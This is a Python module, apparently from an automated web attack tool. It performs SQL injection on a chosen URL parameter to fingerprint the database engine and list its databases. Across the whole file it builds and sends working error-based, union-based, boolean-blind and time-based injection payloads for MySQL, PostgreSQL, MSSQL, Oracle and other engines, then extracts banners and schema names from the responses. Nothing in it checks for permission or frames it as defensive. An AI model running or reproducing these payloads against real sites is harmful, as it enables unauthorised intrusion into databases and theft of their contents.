import requests
import re
import random
import logging
import time
from lib.core.result_manager import ResultManager
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

logger = logging.getLogger(__name__)
_processed_url_params = set()


def extract_between_delimiters(text, delimiter_start='~', delimiter_end='~'):
    pattern = re.compile(re.escape(delimiter_start) + r'(.*?)' + re.escape(delimiter_end), re.DOTALL)
    match = pattern.search(text)
    if match:
        return match.group(1).strip()
    return None


def replace_parameter(url, param, payload):
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if param in params:
        original_value = params[param]
        params[param] = f"{original_value}{payload}"
    new_query = urlencode(params)
    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def get_random_numbers():
    return random.randint(100, 999), random.randint(100, 999)


def get_random_string(length=8):
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(length))


def test_payload(test_url, delimiter_start, delimiter_end):
    try:
        response = requests.get(test_url, timeout=10, allow_redirects=True)
        extracted = extract_between_delimiters(response.text, delimiter_start, delimiter_end)
        if extracted:
            return True, extracted
        return False, None
    except Exception:
        return False, None


def fetch_error_based(url, param, result_manager, domain):
    rnd1, rnd2 = get_random_numbers()
    delimiter_start = chr(0x7e)
    delimiter_end = chr(0x7e)

    banner_queries = {
        'MySQL': 'VERSION()',
        'PostgreSQL': 'VERSION()',
        'Microsoft SQL Server': '@@VERSION',
        'Oracle': '(SELECT banner FROM v$version WHERE ROWNUM=1)',
        'SQLite': '(SELECT sqlite_version())',
        'Firebird': '(SELECT RDB$GET_CONTEXT(\'SYSTEM\',\'ENGINE_VERSION\') FROM RDB$DATABASE)',
        'IBM DB2': '(SELECT service_level FROM TABLE(sysproc.env_get_inst_info()))',
        'HSQLDB': '(SELECT database_version FROM information_schema.system_info)',
        'SAP MaxDB': '(SELECT VERSION FROM DOMAIN.VERSIONS)'
    }

    db_queries = {
        'MySQL': 'GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
        'PostgreSQL': 'STRING_AGG(schemaname, \',\') FROM pg_tables',
        'Microsoft SQL Server': 'STRING_AGG(name, \',\') FROM master.sys.databases',
        'Oracle': 'LISTAGG(owner, \',\') WITHIN GROUP (ORDER BY owner) FROM (SELECT DISTINCT owner FROM all_tables)',
        'SQLite': 'GROUP_CONCAT(name, \',\') FROM sqlite_master WHERE type=\'table\'',
        'Firebird': 'STRING_AGG(rdb$relation_name, \',\') FROM rdb$relations WHERE rdb$view_blr IS NULL',
        'IBM DB2': 'LISTAGG(catalog_name, \',\') FROM syscat.databases',
        'HSQLDB': 'STRING_AGG(table_schem, \',\') FROM information_schema.schemata',
        'SAP MaxDB': 'STRING_AGG(schemaname, \',\') FROM domain.schemata'
    }

    # MySQL Error-based payloads
    mysql_payloads = [
        lambda q: f"' AND EXTRACTVALUE({rnd1},CONCAT(0x5c,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}))-- -",
        lambda q: f"' AND UPDATEXML({rnd1},CONCAT(0x2e,0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()}),{rnd2})-- -",
        lambda q: f"' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{delimiter_start.encode('utf-8').hex()},{q},0x{delimiter_end.encode('utf-8').hex()},'x'))s), 8446744073709551610, 8446744073709551610)))"
    ]

    # PostgreSQL Error-based payloads
    postgres_payloads = [
        lambda q: f"' AND {rnd1}=CAST('{delimiter_start}'||({q})::text||'{delimiter_end}' AS NUMERIC)--",
        lambda q: f"' AND 1=(SELECT CAST('{delimiter_start}'||({q})::text||'{delimiter_end}' AS NUMERIC))--"
    ]

    # MSSQL/Sybase Error-based payloads
    mssql_payloads = [
        lambda q: f"' AND {rnd1}=CONVERT(INT,(SELECT '{delimiter_start}'+({q})+'{delimiter_end}'))--",
        lambda q: f"' AND {rnd1} IN (SELECT ('{delimiter_start}'+({q})+'{delimiter_end}'))--"
    ]

    # Oracle Error-based payloads
    oracle_payloads = [
        lambda q: f"' AND {rnd1}=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'{delimiter_start}'||({q})||'{delimiter_end}'||CHR(62))) FROM DUAL)--",
        lambda q: f"' AND {rnd1}=UTL_INADDR.GET_HOST_ADDRESS('{delimiter_start}'||({q})||'{delimiter_end}')--"
    ]

    # Generic Firebird/SQLite/HSQLDB/MaxDB/DB2 payloads
    generic_payloads = [
        lambda q: f"' AND {rnd1}=('{delimiter_start}'||({q})||'{delimiter_end}')--",
        lambda q: f"' AND {rnd1}=RAISE_ERROR('70001','{delimiter_start}'||({q})||'{delimiter_end}')--"
    ]

    detected_dbms = None
    extracted_banner = None
    extracted_dbs = []
    success = False

    # Test all DBMS types with all available payloads
    for dbms, banner_query in banner_queries.items():
        payloads = []
        if dbms == 'MySQL':
            payloads = mysql_payloads
        elif dbms == 'PostgreSQL':
            payloads = postgres_payloads
        elif dbms == 'Microsoft SQL Server' or dbms == 'Sybase':
            payloads = mssql_payloads
        elif dbms == 'Oracle':
            payloads = oracle_payloads
        else:
            payloads = generic_payloads

        for payload_func in payloads:
            test_payload_banner = payload_func(banner_query)
            test_url = replace_parameter(url, param, test_payload_banner)
            success_banner, extracted_banner_val = test_payload(test_url, delimiter_start, delimiter_end)

            if success_banner:
                detected_dbms = dbms
                extracted_banner = extracted_banner_val
                success = True

                # Now try to get databases
                if dbms in db_queries:
                    db_query = db_queries[dbms]
                    for payload_func_db in payloads:
                        test_payload_db = payload_func_db(db_query)
                        test_url_db = replace_parameter(url, param, test_payload_db)
                        success_db, extracted_dbs_val = test_payload(test_url_db, delimiter_start, delimiter_end)
                        if success_db and extracted_dbs_val:
                            extracted_dbs = [db.strip() for db in extracted_dbs_val.split(',') if db.strip()]
                            break
                break
        if success:
            break

    if extracted_banner or extracted_dbs:
        logger.info("Successfully extracted data via Error-based SQLi")
        result_manager.append_sql_injection(
            url,
            param,
            f"Error-based extraction successful (DBMS: {detected_dbms or 'unknown'})",
            extra={
                'dbms': detected_dbms,
                'banner': extracted_banner,
                'databases': extracted_dbs
            }
        )
        return True
    return False


def fetch_union_based(url, param, result_manager, domain):
    logger.info("Attempting Union-based SQLi extraction")
    try:
        rnd1, rnd2 = get_random_numbers()
        delimiter_start = chr(0x7e)
        delimiter_end = chr(0x7e)

        # Test number of columns from 1 to 50
        max_columns = 50
        for num_columns in range(1, max_columns + 1):
            null_columns = ','.join(['NULL'] * num_columns)

            # Test ORDER BY
            order_by_payload = f"' ORDER BY {num_columns}-- -"
            test_url_order = replace_parameter(url, param, order_by_payload)
            try:
                requests.get(test_url_order, timeout=10, allow_redirects=True)
            except Exception:
                continue

            # Test UNION SELECT
            union_payloads = [
                f"' UNION SELECT {null_columns}-- -",
                f"' UNION ALL SELECT {null_columns}-- -",
                f"') UNION SELECT {null_columns}-- -",
                f"') UNION ALL SELECT {null_columns}-- -",
                f"')) UNION SELECT {null_columns}-- -"
            ]

            for payload_base in union_payloads:
                test_url = replace_parameter(url, param, payload_base)
                try:
                    response = requests.get(test_url, timeout=10, allow_redirects=True)
                    if response.status_code == 200:
                        # Now try to find injectable column
                        for inject_col in range(1, num_columns + 1):
                            columns_list = ['NULL'] * num_columns
                            # Test banner for different DBMS
                            banner_tests = [
                                (f"CONCAT('{delimiter_start}',VERSION(),'{delimiter_end}')", 'MySQL'),
                                (f"CAST(CONCAT('{delimiter_start}',VERSION(),'{delimiter_end}') AS VARCHAR(10000))", 'PostgreSQL'),
                                (f"CONCAT('{delimiter_start}',@@VERSION,'{delimiter_end}')", 'Microsoft SQL Server'),
                                (f"'{delimiter_start}'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'{delimiter_end}'", 'Oracle'),
                                (f"CONCAT('{delimiter_start}',sqlite_version(),'{delimiter_end}')", 'SQLite')
                            ]

                            for banner_query, dbms_name in banner_tests:
                                columns_list[inject_col - 1] = banner_query
                                columns_with_payload = ','.join(columns_list)
                                union_payload_with_data = f"' UNION SELECT {columns_with_payload}-- -"
                                test_url_with_data = replace_parameter(url, param, union_payload_with_data)

                                try:
                                    resp_data = requests.get(test_url_with_data, timeout=10, allow_redirects=True)
                                    extracted_banner = extract_between_delimiters(resp_data.text, delimiter_start, delimiter_end)
                                    if extracted_banner:
                                        logger.info(f"Union-based successful with {num_columns} columns, DBMS: {dbms_name}")
                                        # Try to extract databases
                                        db_queries = {
                                            'MySQL': f"CONCAT('{delimiter_start}',GROUP_CONCAT(schema_name SEPARATOR ','),'{delimiter_end}') FROM information_schema.schemata",
                                            'PostgreSQL': f"CAST(CONCAT('{delimiter_start}',STRING_AGG(schemaname, ','),'{delimiter_end}') AS VARCHAR(10000)) FROM pg_tables",
                                            'Microsoft SQL Server': f"CONCAT('{delimiter_start}',STRING_AGG(name, ','),'{delimiter_end}') FROM master.sys.databases",
                                            'Oracle': f"'{delimiter_start}'||LISTAGG(owner, ',') WITHIN GROUP (ORDER BY owner)||'{delimiter_end}' FROM (SELECT DISTINCT owner FROM all_tables)",
                                            'SQLite': f"CONCAT('{delimiter_start}',GROUP_CONCAT(name, ','),'{delimiter_end}') FROM sqlite_master WHERE type='table'"
                                        }

                                        if dbms_name in db_queries:
                                            db_query = db_queries[dbms_name]
                                            columns_list_db = ['NULL'] * num_columns
                                            columns_list_db[inject_col - 1] = db_query
                                            columns_with_db = ','.join(columns_list_db)
                                            union_payload_db = f"' UNION SELECT {columns_with_db}-- -"
                                            test_url_db = replace_parameter(url, param, union_payload_db)
                                            resp_db = requests.get(test_url_db, timeout=10, allow_redirects=True)
                                            extracted_dbs_str = extract_between_delimiters(resp_db.text, delimiter_start, delimiter_end)
                                            extracted_dbs = [db.strip() for db in extracted_dbs_str.split(',') if db.strip()] if extracted_dbs_str else []

                                            result_manager.append_sql_injection(
                                                url,
                                                param,
                                                "Union-based extraction successful",
                                                extra={
                                                    'dbms': dbms_name,
                                                    'banner': extracted_banner,
                                                    'databases': extracted_dbs
                                                }
                                            )
                                            return True
                                except Exception:
                                    continue
                except Exception:
                    continue

        return False
    except Exception as e:
        logger.error(f"Union-based extraction error: {str(e)}")
        return False


def fetch_boolean_blind(url, param, result_manager, domain):
    logger.info("Attempting Boolean Blind SQLi extraction")
    try:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        original_value = params.get(param, '')

        baseline_urls = []
        for prefix in ["' AND 1=1-- -", "' OR 1=1-- -"]:
            test_url = replace_parameter(url, param, prefix)
            try:
                res = requests.get(test_url, timeout=10, allow_redirects=True)
                baseline_urls.append((len(res.text), res.status_code, test_url))
            except Exception:
                continue

        if not baseline_urls:
            return False

        true_baseline = baseline_urls[0]

        def is_condition_true(condition_payload):
            test_url = replace_parameter(url, param, condition_payload)
            try:
                res = requests.get(test_url, timeout=10, allow_redirects=True)
                return (len(res.text), res.status_code) == (true_baseline[0], true_baseline[1])
            except Exception:
                return False

        def get_value(query):
            value = ""
            for pos in range(1, 200):
                found = False
                # Binary search for faster extraction
                low = 32
                high = 127
                while low <= high:
                    mid = (low + high) // 2
                    payload_gt = f"' AND ASCII(MID(({query}),{pos},1))>{mid}-- -"
                    if is_condition_true(payload_gt):
                        low = mid + 1
                    else:
                        payload_eq = f"' AND ASCII(MID(({query}),{pos},1))={mid}-- -"
                        if is_condition_true(payload_eq):
                            value += chr(mid)
                            found = True
                            break
                        else:
                            high = mid - 1
                if not found:
                    break
            return value

        count = get_value("SELECT COUNT(DISTINCT(schema_name)) FROM information_schema.schemata")
        if not count or not count.isdigit():
            return False

        extracted_dbs = []
        for i in range(int(count)):
            db_name = get_value(f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1")
            if db_name:
                extracted_dbs.append(db_name)

        if extracted_dbs:
            result_manager.append_sql_injection(
                url,
                param,
                "Boolean Blind extraction successful",
                extra={'databases': extracted_dbs}
            )
            logger.info("Successfully extracted databases via Boolean Blind SQLi")
            return True
    except Exception as e:
        logger.error(f"Boolean Blind extraction error: {str(e)}")
    return False


def fetch_time_based(url, param, result_manager, domain):
    logger.info("Attempting Time-based SQLi extraction")
    sleep_time = 5
    try:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))

        def is_condition_true(condition_payload):
            test_url = replace_parameter(url, param, condition_payload)
            try:
                start = time.time()
                requests.get(test_url, timeout=15, allow_redirects=True)
                elapsed = time.time() - start
                return elapsed >= (sleep_time - 1)  # Some tolerance
            except Exception:
                return False

        def get_value(query):
            value = ""
            for pos in range(1, 200):
                found = False
                low = 32
                high = 127
                while low <= high:
                    mid = (low + high) // 2
                    # Try multiple time-based techniques for different DBMS
                    payloads = [
                        f"' AND IF(ASCII(MID(({query}),{pos},1))>{mid},SLEEP({sleep_time}),0)-- -",  # MySQL
                        f"' AND {random.randint(100,999)}=(SELECT CASE WHEN (ASCII(MID(({query}),{pos},1))>{mid}) THEN (SELECT {random.randint(100,999)} FROM PG_SLEEP({sleep_time})) ELSE {random.randint(100,999)} END)--",  # PostgreSQL
                        f"' IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid}) WAITFOR DELAY '0:0:{sleep_time}'--",  # MSSQL
                        f"' AND {random.randint(100,999)}=(SELECT CASE WHEN (ASCII(MID(({query}),{pos},1))>{mid}) THEN DBMS_PIPE.RECEIVE_MESSAGE('{get_random_string()}',{sleep_time}) ELSE {random.randint(100,999)} END FROM DUAL)--"  # Oracle
                    ]

                    for payload_gt in payloads:
                        if is_condition_true(payload_gt):
                            low = mid + 1
                            break
                    else:
                        payload_eq = f"' AND IF(ASCII(MID(({query}),{pos},1))={mid},SLEEP({sleep_time}),0)-- -"
                        if is_condition_true(payload_eq):
                            value += chr(mid)
                            found = True
                            break
                        else:
                            high = mid - 1
                if not found:
                    break
            return value

        count = get_value("SELECT COUNT(DISTINCT(schema_name)) FROM information_schema.schemata")
        if not count or not count.isdigit():
            return False

        extracted_dbs = []
        for i in range(int(count)):
            db_name = get_value(f"SELECT schema_name FROM information_schema.schemata LIMIT {i},1")
            if db_name:
                extracted_dbs.append(db_name)

        if extracted_dbs:
            result_manager.append_sql_injection(
                url,
                param,
                "Time-based extraction successful",
                extra={'databases': extracted_dbs}
            )
            logger.info("Successfully extracted databases via Time-based SQLi")
            return True
    except Exception as e:
        logger.error(f"Time-based extraction error: {str(e)}")
    return False


def fetch_databases_once(url, param, verbose=False):
    key = (url, param)
    if key in _processed_url_params:
        return
    _processed_url_params.add(key)

    domain = urlparse(url).netloc
    result_manager = ResultManager(domain)

    from lib.ui import print_header, print_success, print_warning, print_error

    print_header("Database Name Extraction", color="yellow")

    success = False

    # Order of preference: Error-based -> Union-based -> Boolean-based -> Time-based
    if not success:
        success = fetch_error_based(url, param, result_manager, domain)

    if not success:
        print_warning("Error-based extraction failed, trying Union-based")
        success = fetch_union_based(url, param, result_manager, domain)

    if not success:
        print_warning("Union-based extraction failed, trying Boolean Blind")
        success = fetch_boolean_blind(url, param, result_manager, domain)

    if not success:
        print_warning("Boolean Blind failed, trying Time-based")
        success = fetch_time_based(url, param, result_manager, domain)

    if not success:
        print_warning("Could not extract databases with available techniques.")
